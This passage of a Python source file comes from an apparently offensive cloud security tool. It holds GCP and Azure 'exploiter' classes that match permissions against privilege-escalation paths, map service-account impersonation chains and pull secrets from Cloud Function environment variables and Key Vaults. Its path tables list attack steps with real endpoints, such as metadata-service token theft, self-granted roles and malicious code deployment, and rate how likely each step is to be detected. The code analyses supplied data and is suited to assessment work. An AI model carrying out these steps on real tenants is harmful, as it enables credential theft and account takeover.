            for path_def in self.GCP_PRIVESC_PATHS:
                required = path_def["required_permissions"]
                required_lower = set(p.lower() for p in required)

                is_feasible = required_lower.issubset(perm_set)

                # Check for role-level wildcards
                if not is_feasible:
                    for req in required_lower:
                        parts = req.rsplit(".", 1)
                        if len(parts) == 2:
                            wildcard = parts[0] + ".*"
                            if wildcard in perm_set:
                                is_feasible = True
                                break

                path = CloudPrivEscPath(
                    provider=CloudProvider.GCP,
                    technique=path_def["technique"],
                    source_principal=self._credential.principal if self._credential else "",
                    target_principal="owner",
                    required_permissions=required,
                    current_permissions=perms,
                    steps=path_def["steps"],
                    api_calls=path_def["api_calls"],
                    success_probability=0.80 if is_feasible else 0.0,
                    impact_level=Severity.CRITICAL,
                    is_feasible=is_feasible,
                    detection_risk=path_def.get("detection_risk", "medium"),
                    mitre_technique=path_def.get("mitre", ""),
                    notes=path_def.get("impact", ""),
                )
                self._privesc_paths.append(path)

                if is_feasible:
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.GCP,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.CRITICAL,
                        title=f"GCP PrivEsc: {path_def['name']}",
                        description=(
                            f"Current permissions allow escalation via "
                            f"{path_def['name']}. Required: {', '.join(required)}"
                        ),
                        technique=path_def["name"],
                        is_exploitable=True,
                        exploitation_steps=path_def["steps"],
                        impact=path_def.get("impact", ""),
                        mitre_attack_id=path_def.get("mitre", ""),
                    ))

            feasible = [p for p in self._privesc_paths if p.is_feasible]
            logger.info(
                "GCP: Found %d feasible privesc paths out of %d",
                len(feasible), len(self._privesc_paths),
            )
            return feasible

    def analyze_sa_impersonation_chains(
        self, iam_bindings: Optional[List[Dict[str, Any]]] = None
    ) -> List[Dict[str, Any]]:
        """
        Analyze service account impersonation chains.

        Discovers transitive impersonation: if SA_A can impersonate SA_B,
        and SA_B can impersonate SA_C, then SA_A -> SA_B -> SA_C chain exists.
        """
        with self._lock:
            chains: List[Dict[str, Any]] = []
            bindings = iam_bindings or []

            # Build impersonation graph
            impersonation_graph: Dict[str, Set[str]] = defaultdict(set)
            sa_roles: Dict[str, Set[str]] = defaultdict(set)

            for binding in bindings:
                role = binding.get("role", "")
                members = binding.get("members", [])

                # Check if role grants impersonation
                impersonation_roles = {
                    "roles/iam.serviceAccountTokenCreator",
                    "roles/iam.serviceAccountUser",
                    "roles/iam.serviceAccountKeyAdmin",
                }

                resource = binding.get("resource", "")
                target_sa = ""
                if resource.startswith("projects/") and "/serviceAccounts/" in resource:
                    target_sa = resource.split("/serviceAccounts/")[-1]

                for member in members:
                    if role in impersonation_roles and target_sa:
                        impersonation_graph[member].add(target_sa)
                    sa_roles[member].add(role)

            # Find chains using BFS
            for source in impersonation_graph:
                visited: Set[str] = set()
                queue: List[Tuple[str, List[str]]] = [(source, [source])]

                while queue:
                    current, path = queue.pop(0)
                    if current in visited:
                        continue
                    visited.add(current)

                    targets = impersonation_graph.get(current, set())
                    for target in targets:
                        new_path = path + [target]
                        if len(new_path) > 1:
                            chain = {
                                "source": source,
                                "target": target,
                                "path": new_path,
                                "depth": len(new_path) - 1,
                                "is_transitive": len(new_path) > 2,
                                "target_roles": list(sa_roles.get(
                                    f"serviceAccount:{target}", set()
                                )),
                            }
                            chains.append(chain)

                            if len(new_path) > 2:
                                self._findings.append(CloudFinding(
                                    provider=CloudProvider.GCP,
                                    category=AttackCategory.IDENTITY_IMPERSONATION,
                                    severity=Severity.HIGH,
                                    title=f"Transitive SA Impersonation Chain ({len(new_path)-1} hops)",
                                    description=(
                                        f"Impersonation chain: {' -> '.join(new_path)}"
                                    ),
                                    technique="Service Account Impersonation Chain",
                                    is_exploitable=True,
                                    mitre_attack_id="T1550.001",
                                ))

                        if target not in visited:
                            queue.append((target, new_path))

            self._impersonation_chains = chains
            logger.info("Discovered %d SA impersonation chains", len(chains))
            return chains

    def extract_cloud_function_secrets(
        self, functions: Optional[List[Dict[str, Any]]] = None
    ) -> Dict[str, Dict[str, str]]:
        """Extract secrets from Cloud Functions environment variables."""
        with self._lock:
            secrets: Dict[str, Dict[str, str]] = {}
            funcs = functions or self._discovered_functions

            for func in funcs:
                func_name = func.get("name", func.get("function_name", "unknown"))
                if "/" in func_name:
                    func_name = func_name.split("/")[-1]

                env_vars = func.get("environmentVariables", {})
                if not env_vars:
                    env_vars = func.get("buildEnvironmentVariables", {})
                    env_vars.update(func.get("serviceConfig", {}).get("environmentVariables", {}))

                found_secrets: Dict[str, str] = {}
                for key, value in env_vars.items():
                    key_upper = key.upper()
                    if key_upper in self.GCF_SECRET_ENV_VARS:
                        found_secrets[key] = value
                    elif any(
                        kw in key_upper
                        for kw in [
                            "SECRET", "PASSWORD", "TOKEN", "KEY", "CREDENTIAL",
                            "AUTH", "PRIVATE", "CERT", "API_KEY",
                        ]
                    ):
                        found_secrets[key] = value
                    elif value.startswith("{") and '"type": "service_account"' in value:
                        found_secrets[key] = value

                if found_secrets:
                    secrets[func_name] = found_secrets
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.GCP,
                        category=AttackCategory.SECRETS_EXTRACTION,
                        severity=Severity.CRITICAL,
                        title=f"Secrets in Cloud Function: {func_name}",
                        description=(
                            f"Found {len(found_secrets)} secrets in Cloud Function "
                            f"'{func_name}': {', '.join(found_secrets.keys())}"
                        ),
                        technique="Cloud Functions Environment Extraction",
                        is_exploitable=True,
                        evidence={"secret_keys": list(found_secrets.keys())},
                        remediation="Use Secret Manager. Never store secrets in env vars.",
                        mitre_attack_id="T1552.001",
                    ))

            self._function_secrets = secrets
            return secrets

    def enumerate_gcs_buckets(
        self, project_id: Optional[str] = None
    ) -> List[Dict[str, Any]]:
        """
        Enumerate GCS buckets in the project and check for misconfigurations.

        Analyzes:
            - Public access settings
            - Uniform vs fine-grained ACLs
            - Bucket-level IAM policies
            - Encryption configuration
            - Retention policies and lifecycle rules
        """
        with self._lock:
            bucket_results: List[Dict[str, Any]] = []
            proj = project_id or self._project_id

            # Analyze discovered buckets
            for bucket in self._discovered_buckets:
                name = bucket.get("name", "")
                result: Dict[str, Any] = {
                    "name": name,
                    "project": proj,
                    "location": bucket.get("location", ""),
                    "storage_class": bucket.get("storageClass", ""),
                    "issues": [],
                }

                # Check IAM configuration
                iam_config = bucket.get("iamConfiguration", {})
                uniform = iam_config.get("uniformBucketLevelAccess", {})
                if not uniform.get("enabled", False):
                    result["issues"].append({
                        "type": "fine_grained_acl",
                        "severity": "medium",
                        "description": "Bucket uses legacy fine-grained ACLs instead of uniform access",
                    })

                public_access = iam_config.get("publicAccessPrevention", "")
                if public_access != "enforced":
                    result["issues"].append({
                        "type": "public_access_not_prevented",
                        "severity": "high",
                        "description": "Public access prevention is not enforced",
                    })

                # Check encryption
                encryption = bucket.get("encryption", {})
                if not encryption.get("defaultKmsKeyName"):
                    result["issues"].append({
                        "type": "no_cmek",
                        "severity": "low",
                        "description": "Bucket uses Google-managed encryption, not customer-managed (CMEK)",
                    })

                # Check versioning
                versioning = bucket.get("versioning", {})
                if not versioning.get("enabled", False):
                    result["issues"].append({
                        "type": "no_versioning",
                        "severity": "low",
                        "description": "Object versioning is not enabled",
                    })

                # Check logging
                logging_config = bucket.get("logging", {})
                if not logging_config.get("logBucket"):
                    result["issues"].append({
                        "type": "no_logging",
                        "severity": "medium",
                        "description": "Access logging is not configured",
                    })

                # Check retention policy
                retention = bucket.get("retentionPolicy", {})
                if not retention:
                    result["issues"].append({
                        "type": "no_retention",
                        "severity": "low",
                        "description": "No retention policy configured",
                    })

                if result["issues"]:
                    max_sev = max(
                        result["issues"],
                        key=lambda x: {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}.get(
                            x.get("severity", "info"), 0
                        ),
                    )
                    sev_map = {
                        "critical": Severity.CRITICAL,
                        "high": Severity.HIGH,
                        "medium": Severity.MEDIUM,
                        "low": Severity.LOW,
                    }
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.GCP,
                        category=AttackCategory.STORAGE_ENUMERATION,
                        severity=sev_map.get(max_sev["severity"], Severity.INFO),
                        title=f"GCS Bucket Misconfiguration: {name}",
                        description=(
                            f"Found {len(result['issues'])} issues in bucket '{name}'"
                        ),
                        technique="GCS Bucket Analysis",
                        evidence={"issues": result["issues"]},
                        remediation="Enable uniform access, public access prevention, CMEK, and logging.",
                    ))

                bucket_results.append(result)

            return bucket_results

    def get_findings(self) -> List[CloudFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def get_privesc_paths(self) -> List[CloudPrivEscPath]:
        """Return all privesc paths."""
        with self._lock:
            return list(self._privesc_paths)

    def get_feasible_paths(self) -> List[CloudPrivEscPath]:
        """Return only feasible privesc paths."""
        with self._lock:
            return [p for p in self._privesc_paths if p.is_feasible]

    def to_dict(self) -> Dict[str, Any]:
        """Serialize exploiter state."""
        with self._lock:
            feasible = [p for p in self._privesc_paths if p.is_feasible]
            return {
                "provider": "GCP",
                "project_id": self._project_id,
                "region": self._region,
                "total_privesc_paths": len(self._privesc_paths),
                "feasible_paths": len(feasible),
                "impersonation_chains": len(self._impersonation_chains),
                "function_secrets_count": sum(
                    len(v) for v in self._function_secrets.values()
                ),
                "bucket_findings": len(self._discovered_buckets),
                "findings": [f.to_dict() for f in self._findings],
                "privesc_paths": [p.to_dict() for p in feasible],
            }


# ════════════════════════════════════════════════════════════════════════════════
# AZURE EXPLOITER — Managed Identity, Blob Storage, Key Vault
# ════════════════════════════════════════════════════════════════════════════════

class AzureExploiter:
    """
    Azure-specific exploitation engine for privilege escalation and data access.

    Capabilities:
        - Managed identity token extraction and abuse
        - Blob storage enumeration and data exfiltration
        - Key Vault secret/key/certificate extraction
        - Role assignment escalation
        - Automation runbook execution
        - VM run command exploitation

    Usage:
        exploiter = AzureExploiter(credential=azure_cred)
        paths = exploiter.find_privesc_paths()
        secrets = exploiter.extract_keyvault_secrets()
    """

    # Azure PrivEsc paths
    AZURE_PRIVESC_PATHS: List[Dict[str, Any]] = [
        {
            "technique": PrivEscTechnique.AZURE_MANAGED_IDENTITY,
            "name": "Managed Identity Token Theft",
            "required_permissions": [],
            "api_calls": [
                {
                    "service": "IMDS",
                    "method": "GET",
                    "url": "http://169.254.169.254/metadata/identity/oauth2/token",
                }
            ],
            "steps": [
                "Access Azure IMDS from within VM or container",
                "Request managed identity token for various resources",
                "Use token for ARM, Key Vault, Storage, Graph API access",
            ],
            "impact": "Access all resources the managed identity has permissions for",
            "detection_risk": "low",
            "mitre": "T1552.005",
        },
        {
            "technique": PrivEscTechnique.AZURE_ROLE_ASSIGNMENT,
            "name": "Create Role Assignment (Self-Elevate)",
            "required_permissions": [
                "Microsoft.Authorization/roleAssignments/write",
            ],
            "api_calls": [
                {
                    "service": "ARM",
                    "method": "PUT",
                    "url": "https://management.azure.com/{scope}/providers/Microsoft.Authorization/roleAssignments/{id}",
                }
            ],
            "steps": [
                "Identify current principal's object ID",
                "Create a role assignment granting Owner or Contributor",
                "Assignment takes effect within minutes",
            ],
            "impact": "Owner/Contributor access to subscription or resource group",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AZURE_KEYVAULT_ACCESS,
            "name": "Key Vault Secret Extraction",
            "required_permissions": [
                "Microsoft.KeyVault/vaults/secrets/getSecret/action",
            ],
            "api_calls": [
                {
                    "service": "KeyVault",
                    "method": "GET",
                    "url": "https://{vault_name}.vault.azure.net/secrets?api-version=7.3",
                }
            ],
            "steps": [
                "Enumerate accessible Key Vaults",
                "List secrets, keys, and certificates",
                "Extract secret values including connection strings and API keys",
            ],
            "impact": "Access to all secrets stored in Key Vault",
            "detection_risk": "medium",
            "mitre": "T1555.006",
        },
        {
            "technique": PrivEscTechnique.AZURE_AUTOMATION_RUNBOOK,
            "name": "Automation Account Runbook Execution",
            "required_permissions": [
                "Microsoft.Automation/automationAccounts/runbooks/draft/write",
                "Microsoft.Automation/automationAccounts/jobs/write",
            ],
            "api_calls": [
                {
                    "service": "ARM",
                    "method": "PUT",
                    "url": "https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Automation/automationAccounts/{account}/runbooks/{runbook}",
                }
            ],
            "steps": [
                "Identify Automation Account with Run As account or Managed Identity",
                "Create or modify a PowerShell runbook",
                "Runbook executes with the Automation Account's identity",
                "Extract credentials or perform privileged operations",
            ],
            "impact": "Code execution with Automation Account privileges",
            "detection_risk": "medium",
            "mitre": "T1059.001",
        },
        {
            "technique": PrivEscTechnique.AZURE_VM_RUN_COMMAND,
            "name": "VM Run Command Execution",
            "required_permissions": [
                "Microsoft.Compute/virtualMachines/runCommand/action",
            ],
            "api_calls": [
                {
                    "service": "ARM",
                    "method": "POST",
                    "url": "https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand",
                }
            ],
            "steps": [
                "Identify VMs with managed identity attached",
                "Execute command via VM Run Command API",
                "Extract managed identity token from within VM",
                "Access resources using the VM's identity",
            ],
            "impact": "Remote command execution on Azure VMs",
            "detection_risk": "medium",
            "mitre": "T1059.001",
        },
        {
            "technique": PrivEscTechnique.AZURE_LOGIC_APP,
            "name": "Logic App with Managed Identity",
            "required_permissions": [
                "Microsoft.Logic/workflows/write",
                "Microsoft.Logic/workflows/run/action",
            ],
            "api_calls": [
                {
                    "service": "ARM",
                    "method": "PUT",
                    "url": "https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Logic/workflows/{workflow}",
                }
            ],
            "steps": [
                "Create or modify a Logic App with HTTP action",
                "Assign managed identity to the Logic App",
                "Logic App calls ARM API using its managed identity",
                "Extract token or perform privileged ARM operations",
            ],
            "impact": "Arbitrary ARM API calls via Logic App identity",
            "detection_risk": "low",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AZURE_FUNCTION_APP,
            "name": "Function App Code Injection",
            "required_permissions": [
                "Microsoft.Web/sites/write",
                "Microsoft.Web/sites/publish/action",
            ],
            "api_calls": [
                {
                    "service": "ARM",
                    "method": "POST",
                    "url": "https://{function_app}.scm.azurewebsites.net/api/zipdeploy",
                }
            ],
            "steps": [
                "Identify Function App with managed identity",
                "Deploy malicious function code via SCM/Kudu API",
                "Function executes with the app's managed identity",
                "Extract identity tokens for ARM, Key Vault, etc.",
            ],
            "impact": "Code execution with Function App identity",
            "detection_risk": "medium",
            "mitre": "T1059.006",
        },
        {
            "technique": PrivEscTechnique.AZURE_APP_REG_SECRET,
            "name": "Add Secret to App Registration",
            "required_permissions": [
                "microsoft.directory/applications/credentials/update",
            ],
            "api_calls": [
                {
                    "service": "Graph",
                    "method": "POST",
                    "url": "https://graph.microsoft.com/v1.0/applications/{app_id}/addPassword",
                }
            ],
            "steps": [
                "Identify an App Registration with privileged API permissions",
                "Add a new client secret to the application",
                "Authenticate as the application using the new secret",
                "Access resources granted to the application",
            ],
            "impact": "Assume application identity with all its API permissions",
            "detection_risk": "high",
            "mitre": "T1098.001",
        },
        {
            "technique": PrivEscTechnique.AZURE_CUSTOM_ROLE,
            "name": "Create Custom Role with Elevated Permissions",
            "required_permissions": [
                "Microsoft.Authorization/roleDefinitions/write",
            ],
            "api_calls": [
                {
                    "service": "ARM",
                    "method": "PUT",
                    "url": "https://management.azure.com/{scope}/providers/Microsoft.Authorization/roleDefinitions/{id}",
                }
            ],
            "steps": [
                "Create a custom role with desired elevated permissions",
                "Assign the custom role to current principal",
                "Gain the elevated permissions",
            ],
            "impact": "Custom role with arbitrary permissions",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AZURE_STORAGE_SAS,
            "name": "Generate Storage Account SAS Token",
            "required_permissions": [
                "Microsoft.Storage/storageAccounts/listKeys/action",
            ],
            "api_calls": [
                {
                    "service": "ARM",
                    "method": "POST",
                    "url": "https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{account}/listKeys",
                }
            ],
            "steps": [
                "List storage account access keys",
                "Generate SAS token with full access",
                "Use SAS token for persistent storage access",
            ],
            "impact": "Full access to storage account data",
            "detection_risk": "medium",
            "mitre": "T1528",
        },
    ]

    # Azure resource types for enumeration
    AZURE_RESOURCE_TYPES = [
        "Microsoft.Compute/virtualMachines",
        "Microsoft.Storage/storageAccounts",
        "Microsoft.KeyVault/vaults",
        "Microsoft.Web/sites",
        "Microsoft.Sql/servers",
        "Microsoft.Automation/automationAccounts",
        "Microsoft.Logic/workflows",
        "Microsoft.ContainerService/managedClusters",
        "Microsoft.Network/virtualNetworks",
        "Microsoft.Network/networkSecurityGroups",
    ]

    def __init__(
        self,
        credential: Optional[CloudCredential] = None,
        subscription_id: str = "",
        tenant_id: str = "",
    ) -> None:
        self._lock = threading.RLock()
        self._credential = credential
        self._subscription_id = subscription_id
        self._tenant_id = tenant_id
        self._findings: List[CloudFinding] = []
        self._privesc_paths: List[CloudPrivEscPath] = []
        self._discovered_vaults: List[Dict[str, Any]] = []
        self._discovered_storage: List[Dict[str, Any]] = []
        self._discovered_vms: List[Dict[str, Any]] = []
        self._keyvault_secrets: Dict[str, List[Dict[str, str]]] = {}
        self._blob_findings: List[Dict[str, Any]] = []
        logger.info(
            "AzureExploiter initialized (subscription=%s)", subscription_id[:8] + "..." if subscription_id else "none"
        )

    def find_privesc_paths(
        self, current_permissions: Optional[List[str]] = None
    ) -> List[CloudPrivEscPath]:
        """Analyze current permissions against Azure privesc paths."""
        with self._lock:
            perms = current_permissions or []
            perm_set = set(p.lower() for p in perms)
            self._privesc_paths.clear()

            for path_def in self.AZURE_PRIVESC_PATHS:
                required = path_def["required_permissions"]
                required_lower = set(p.lower() for p in required)

                # Empty required means always feasible (e.g., IMDS from within VM)
                if not required:
                    is_feasible = True
                else:
                    is_feasible = required_lower.issubset(perm_set)

                    # Check wildcard (e.g., */write matches specific write actions)
                    if not is_feasible:
                        for req in required_lower:
                            for avail in perm_set:
                                if avail == "*" or avail == "*/write" or avail == "*/action":
                                    is_feasible = True
                                    break
                                if avail.endswith("/*") and req.startswith(avail[:-1]):
                                    is_feasible = True
                                    break
                            if is_feasible:
                                break

                path = CloudPrivEscPath(
                    provider=CloudProvider.AZURE,
                    technique=path_def["technique"],
                    source_principal=self._credential.principal if self._credential else "",
                    target_principal="owner",
                    required_permissions=required,
                    current_permissions=perms,
                    steps=path_def["steps"],
                    api_calls=path_def["api_calls"],
                    success_probability=0.80 if is_feasible else 0.0,
                    impact_level=Severity.CRITICAL,
                    is_feasible=is_feasible,
                    detection_risk=path_def.get("detection_risk", "medium"),
                    mitre_technique=path_def.get("mitre", ""),
                    notes=path_def.get("impact", ""),
                )
                self._privesc_paths.append(path)

                if is_feasible:
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.AZURE,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.CRITICAL,
                        title=f"Azure PrivEsc: {path_def['name']}",
                        description=(
                            f"Privilege escalation possible via {path_def['name']}. "
                            f"Required: {', '.join(required) if required else 'N/A (IMDS)'}"
                        ),
                        technique=path_def["name"],
                        is_exploitable=True,
                        exploitation_steps=path_def["steps"],
                        impact=path_def.get("impact", ""),
                        mitre_attack_id=path_def.get("mitre", ""),
                    ))

            feasible = [p for p in self._privesc_paths if p.is_feasible]
            logger.info(
                "Azure: Found %d feasible privesc paths out of %d",
                len(feasible), len(self._privesc_paths),
            )
            return feasible

    def enumerate_blob_storage(
        self, storage_accounts: Optional[List[Dict[str, Any]]] = None
    ) -> List[Dict[str, Any]]:
        """
        Enumerate Azure Blob Storage for misconfigurations and sensitive data.

        Checks:
            - Public container access
            - Anonymous blob access
            - Shared access signatures (SAS) in URLs
            - Sensitive file exposure
            - Missing encryption
        """
        with self._lock:
            results: List[Dict[str, Any]] = []
            accounts = storage_accounts or self._discovered_storage

            for account in accounts:
                account_name = account.get("name", "")
                properties = account.get("properties", {})

                result: Dict[str, Any] = {
                    "account_name": account_name,
                    "issues": [],
                    "containers": [],
                }

                # Check HTTPS enforcement
                if not properties.get("supportsHttpsTrafficOnly", True):
                    result["issues"].append({
                        "type": "http_allowed",
                        "severity": "high",
                        "description": "Storage account allows unencrypted HTTP traffic",
                    })

                # Check minimum TLS version
                min_tls = properties.get("minimumTlsVersion", "")
                if min_tls and min_tls < "TLS1_2":
                    result["issues"].append({
                        "type": "weak_tls",
                        "severity": "medium",
                        "description": f"Minimum TLS version is {min_tls}, should be TLS1_2",
                    })

                # Check blob public access
                allow_blob_public = properties.get("allowBlobPublicAccess", False)
                if allow_blob_public:
                    result["issues"].append({
                        "type": "public_blob_access",
                        "severity": "critical",
                        "description": "Blob public access is enabled at account level",
                    })

                # Check shared key access
                allow_shared_key = properties.get("allowSharedKeyAccess", True)
                if allow_shared_key:
                    result["issues"].append({
                        "type": "shared_key_enabled",
                        "severity": "medium",
                        "description": "Shared key access is enabled (prefer Azure AD auth)",
                    })

                # Check network rules
                network_rules = properties.get("networkAcls", {})
                default_action = network_rules.get("defaultAction", "Allow")
                if default_action == "Allow":
                    result["issues"].append({
                        "type": "network_open",
                        "severity": "high",
                        "description": "Default network action is Allow (accessible from any network)",
                    })

                # Check encryption
                encryption = properties.get("encryption", {})
                if not encryption.get("requireInfrastructureEncryption", False):
                    result["issues"].append({
                        "type": "no_infra_encryption",
                        "severity": "low",
                        "description": "Infrastructure encryption (double encryption) is not enabled",
                    })

                if result["issues"]:
                    sev_map = {"critical": 4, "high": 3, "medium": 2, "low": 1}
                    max_sev = max(
                        result["issues"],
                        key=lambda x: sev_map.get(x.get("severity", "low"), 0),
                    )
                    severity_enum = {
                        "critical": Severity.CRITICAL,
                        "high": Severity.HIGH,
                        "medium": Severity.MEDIUM,
                        "low": Severity.LOW,
                    }
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.AZURE,
                        category=AttackCategory.STORAGE_ENUMERATION,
                        severity=severity_enum.get(max_sev["severity"], Severity.INFO),
                        title=f"Azure Storage Misconfiguration: {account_name}",
                        description=(
                            f"Found {len(result['issues'])} issues in storage account '{account_name}'"
                        ),
                        technique="Azure Blob Storage Analysis",
                        evidence={"issues": result["issues"]},
                        remediation="Disable public blob access, enforce HTTPS, restrict network access.",
                    ))

                results.append(result)
                self._blob_findings.append(result)

            return results

    def extract_keyvault_secrets(
        self, vaults: Optional[List[Dict[str, Any]]] = None
    ) -> Dict[str, List[Dict[str, str]]]:
        """
        Extract secrets from Azure Key Vaults.

        Enumerates:
            - Secrets (passwords, connection strings)
            - Keys (cryptographic keys)
            - Certificates (TLS certs with private keys)
        """
        with self._lock:
            results: Dict[str, List[Dict[str, str]]] = {}
            vault_list = vaults or self._discovered_vaults

            for vault in vault_list:
                vault_name = vault.get("name", "")
                vault_url = vault.get("properties", {}).get(
                    "vaultUri", f"https://{vault_name}.vault.azure.net"
                )

                secrets_found: List[Dict[str, str]] = []

                # Process discovered secrets
                vault_secrets = vault.get("secrets", [])
                for secret in vault_secrets:
                    secret_name = secret.get("id", "").split("/")[-1] if "/" in secret.get("id", "") else secret.get("name", "")
                    secret_info: Dict[str, str] = {
                        "name": secret_name,
                        "type": "secret",
                        "content_type": secret.get("contentType", ""),
                        "enabled": str(secret.get("attributes", {}).get("enabled", True)),
                        "created": str(secret.get("attributes", {}).get("created", "")),
                        "updated": str(secret.get("attributes", {}).get("updated", "")),
                    }

                    # Check if secret name suggests sensitive content
                    sensitive_keywords = [
                        "password", "connection", "key", "secret", "token",
                        "credential", "cert", "private", "api", "auth",
                        "database", "db", "sql", "redis", "mongo",
                        "storage", "sas", "access", "master",
                    ]
                    is_sensitive = any(
                        kw in secret_name.lower() for kw in sensitive_keywords
                    )
                    secret_info["is_sensitive"] = str(is_sensitive)

                    if secret.get("value"):
                        secret_info["value_preview"] = secret["value"][:20] + "..."
                        secret_info["has_value"] = "true"
                    else:
                        secret_info["has_value"] = "false"

                    secrets_found.append(secret_info)

                # Process discovered keys
                vault_keys = vault.get("keys", [])
                for key in vault_keys:
                    key_name = key.get("kid", "").split("/")[-1] if "/" in key.get("kid", "") else key.get("name", "")
                    key_info: Dict[str, str] = {
                        "name": key_name,
                        "type": "key",
                        "key_type": key.get("kty", ""),
                        "key_ops": ",".join(key.get("key_ops", [])),
                        "enabled": str(key.get("attributes", {}).get("enabled", True)),
                    }
                    secrets_found.append(key_info)

                # Process discovered certificates
                vault_certs = vault.get("certificates", [])
                for cert in vault_certs:
                    cert_name = cert.get("id", "").split("/")[-1] if "/" in cert.get("id", "") else cert.get("name", "")
                    cert_info: Dict[str, str] = {
                        "name": cert_name,
                        "type": "certificate",
                        "subject": cert.get("x5t", ""),
                        "enabled": str(cert.get("attributes", {}).get("enabled", True)),
                    }
                    secrets_found.append(cert_info)

                if secrets_found:
                    results[vault_name] = secrets_found
                    sensitive_count = sum(
                        1 for s in secrets_found if s.get("is_sensitive") == "true"
                    )
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.AZURE,
                        category=AttackCategory.KEY_VAULT_ACCESS,
                        severity=Severity.CRITICAL if sensitive_count > 0 else Severity.HIGH,
                        title=f"Key Vault Secrets Accessible: {vault_name}",
                        description=(
                            f"Accessed {len(secrets_found)} items from Key Vault '{vault_name}' "
                            f"({sensitive_count} potentially sensitive)."
                        ),
                        technique="Azure Key Vault Extraction",
                        is_exploitable=True,
                        evidence={
                            "total_items": len(secrets_found),
                            "sensitive_items": sensitive_count,
                            "item_names": [s["name"] for s in secrets_found[:20]],
                        },
                        remediation=(
                            "Review Key Vault access policies. Use RBAC instead of access policies. "
                            "Enable Key Vault audit logging. Rotate compromised secrets."
                        ),
                        mitre_attack_id="T1555.006",
                    ))

            self._keyvault_secrets = results
            return results

    def get_findings(self) -> List[CloudFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def get_privesc_paths(self) -> List[CloudPrivEscPath]:
        """Return all privesc paths."""
        with self._lock:
            return list(self._privesc_paths)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize exploiter state."""
        with self._lock:
            feasible = [p for p in self._privesc_paths if p.is_feasible]
            return {
                "provider": "Azure",
                "subscription_id": self._subscription_id,
                "total_privesc_paths": len(self._privesc_paths),
                "feasible_paths": len(feasible),
                "keyvault_secrets_count": sum(
                    len(v) for v in self._keyvault_secrets.values()
                ),
                "blob_findings": len(self._blob_findings),
                "findings": [f.to_dict() for f in self._findings],
                "privesc_paths": [p.to_dict() for p in feasible],
            }


# ════════════════════════════════════════════════════════════════════════════════
# CLOUD PRIVESC CHAIN — Multi-step attack path synthesis
# ════════════════════════════════════════════════════════════════════════════════

class CloudPrivEscChain:
    """
    Synthesizes multi-step privilege escalation chains across cloud services.

    Combines findings from individual exploiters to find transitive
    attack paths that span multiple services and even providers.

    Usage:
        chain = CloudPrivEscChain()
        chain.add_paths(aws_paths)
        chain.add_paths(gcp_paths)
        full_chains = chain.synthesize_chains()
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._all_paths: List[CloudPrivEscPath] = []
        self._synthesized_chains: List[Dict[str, Any]] = []
        self._adjacency: Dict[str, List[str]] = defaultdict(list)
        logger.info("CloudPrivEscChain initialized")

    def add_paths(self, paths: List[CloudPrivEscPath]) -> None:
        """Add privilege escalation paths to the chain analyzer."""
        with self._lock:
            self._all_paths.extend(paths)
            for path in paths:
                if path.is_feasible:
                    self._adjacency[path.source_principal].append(path.path_id)

    def synthesize_chains(self, max_depth: int = 5) -> List[Dict[str, Any]]:
        """
        Synthesize multi-step privilege escalation chains.

        Uses BFS to find transitive chains where the output of one
        privesc step enables the next.
        """
        with self._lock:
            self._synthesized_chains.clear()

            feasible = [p for p in self._all_paths if p.is_feasible]
            if not feasible:
                return []

            # Build permission-based adjacency graph
            # Node = set of permissions, Edge = privesc technique
            perm_graph: Dict[str, List[Tuple[str, CloudPrivEscPath]]] = defaultdict(list)

            for path in feasible:
                perm_key = ",".join(sorted(path.required_permissions))
                result_key = path.target_principal
                perm_graph[perm_key].append((result_key, path))

            # Find chains starting from each feasible path
            for start_path in feasible:
                chain = self._build_chain(start_path, feasible, max_depth)
                if chain and len(chain["steps"]) > 1:
                    self._synthesized_chains.append(chain)

            # Deduplicate and sort by impact
            unique_chains = self._deduplicate_chains(self._synthesized_chains)
            unique_chains.sort(
                key=lambda c: c.get("total_impact_score", 0), reverse=True
            )

            logger.info("Synthesized %d unique multi-step chains", len(unique_chains))
            return unique_chains

    def _build_chain(
        self,
        start: CloudPrivEscPath,
        all_paths: List[CloudPrivEscPath],
        max_depth: int,
    ) -> Optional[Dict[str, Any]]:
        """Build a chain starting from a given path."""
        chain_steps: List[Dict[str, Any]] = []
        visited_techniques: Set[str] = set()
        current_perms: Set[str] = set(start.current_permissions)
        current_perms.update(start.required_permissions)

        chain_steps.append({
            "step": 1,
            "technique": start.technique.name,
            "provider": start.provider.name,
            "description": start.notes,
            "detection_risk": start.detection_risk,
        })
        visited_techniques.add(start.technique.name)

        for depth in range(1, max_depth):
            found_next = False
            for path in all_paths:
                if path.technique.name in visited_techniques:
                    continue
                # Check if current permissions enable this path
                req_set = set(p.lower() for p in path.required_permissions)
                curr_lower = set(p.lower() for p in current_perms)
                if req_set.issubset(curr_lower) or not req_set:
                    chain_steps.append({
                        "step": depth + 1,
                        "technique": path.technique.name,
                        "provider": path.provider.name,
                        "description": path.notes,
                        "detection_risk": path.detection_risk,
                    })
                    visited_techniques.add(path.technique.name)
                    current_perms.update(path.required_permissions)
                    found_next = True
                    break

            if not found_next:
                break

        if len(chain_steps) <= 1:
            return None

        risk_scores = {"low": 1, "medium": 2, "high": 3, "critical": 4}
        total_risk = sum(
            risk_scores.get(s.get("detection_risk", "medium"), 2)
            for s in chain_steps
        )

        return {
